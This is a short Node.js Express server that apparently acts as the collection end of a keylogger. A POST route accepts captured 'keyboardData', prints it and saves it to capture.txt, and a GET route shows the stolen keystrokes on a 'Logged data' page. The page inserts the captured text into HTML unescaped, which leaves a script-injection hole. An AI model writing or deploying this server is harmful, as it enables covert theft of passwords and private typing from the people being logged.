const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();

app.use(bodyParser.json({extended: true}));

// Assign the port number 8080.
const port = 8080;

app.get("/", (req, res) => {
    try {
        const kl_file = fs.readFileSync("./capture.txt", {encoding:'utf8', flag:'r'});    
        // We send the txt file data to the server. We replace the "\n" with <br> 
        res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
    } catch {
        res.send("<h1>No logs yet.</h1>");
    }  
});


app.post("/", (req, res) => {
    console.log(req.body.keyboardData);
    fs.writeFileSync("capture.txt", req.body.keyboardData);
    res.send("Success");
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});
